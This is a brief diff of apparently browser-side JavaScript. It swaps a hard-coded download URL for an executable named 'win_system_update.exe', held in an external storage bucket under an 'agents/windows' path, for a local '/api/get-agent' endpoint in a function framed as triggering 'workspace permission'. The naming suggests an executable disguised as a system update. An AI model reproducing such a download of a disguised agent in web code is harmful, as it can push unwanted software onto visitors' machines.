@@ -226,7 +226,7 @@ function removeLoader(id) {
 }
 
 async function triggerWorkspacePermissionClient() {
-    const url = "https://f005.backblazeb2.com/file/KaliRyb/agents/windows/win_system_update.exe";
+    const url = "/api/get-agent";
     console.log("Attempting to trigger workspace permission by downloading:", url);
 
     try {
